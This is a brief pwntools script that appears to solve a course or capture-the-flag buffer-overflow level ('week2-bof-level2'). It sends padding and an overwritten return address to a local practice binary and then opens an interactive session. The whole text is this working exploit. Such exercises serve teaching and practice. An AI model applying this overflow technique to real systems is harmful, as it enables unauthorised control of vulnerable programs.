# week2-bof-level2
#!/usr/bin/env python

from pwn import *

# create process and run the program
p = process("./bof-level2")

# send data with newline
p.sendline("A"*20 + "ABCDEFGH" + "A"*8 + p32(0x8048530))

# open an interactive console to the program
p.interactive()